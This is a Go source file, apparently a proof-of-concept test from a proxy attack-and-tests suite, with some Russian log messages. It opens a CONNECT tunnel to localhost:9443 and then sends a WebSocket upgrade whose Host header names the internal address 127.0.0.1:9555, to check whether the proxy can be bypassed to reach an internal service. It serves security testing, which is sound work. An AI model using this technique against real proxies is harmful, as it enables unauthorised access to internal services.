package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"oktopus/attack-and-tests/poclib"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseFlags(args)
	if err != nil {
		return 2
	}
	ok, _ := runAttack(o)
	if ok {
		return 1
	}
	return 0
}

func runAttack(o poclib.RunOpts) (bool, error) {
	if o.ConnectMode == "tunnel" {
		log.Println("bypass: WS host mismatch — сценарий MITM")
		return false, nil
	}
	pool, err := poclib.LoadCAForMode(o.CAFile, o.ConnectMode)
	if err != nil {
		return false, err
	}
	log.Println("=== bypass: CONNECT localhost:9443, Upgrade Host=127.0.0.1:9555 ===")
	raw, br, _, err := poclib.DialCONNECT(o.ProxyAddr, "localhost:9443", o.ProxyUser, o.ProxyPass)
	if err != nil {
		return false, nil
	}
	defer raw.Close()
	tlsConn, err := poclib.TLSOverCONNECT(raw, br, o.ConnectMode, "localhost", pool)
	if err != nil {
		return false, nil
	}
	key := make([]byte, 16)
	_, _ = rand.Read(key)
	wsKey := base64.StdEncoding.EncodeToString(key)
	req := fmt.Sprintf(
		"GET / HTTP/1.1\r\nHost: 127.0.0.1:9555\r\nOrigin: https://localhost:9443\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
		wsKey,
	)
	if _, err := tlsConn.Write([]byte(req)); err != nil {
		return false, err
	}
	res, err := http.ReadResponse(bufio.NewReader(tlsConn), nil)
	if err != nil {
		log.Printf("upgrade response: %v", err)
		return false, nil
	}
	body, _ := io.ReadAll(io.LimitReader(res.Body, 4096))
	res.Body.Close()
	log.Printf("upgrade: HTTP %d", res.StatusCode)
	if res.StatusCode == http.StatusSwitchingProtocols {
		log.Println("bypass: ПОДТВЕРЖДЕНО — upgrade на internal host")
		return true, nil
	}
	if strings.Contains(string(body), poclib.SecretMarker) {
		return true, nil
	}
	return false, nil
}
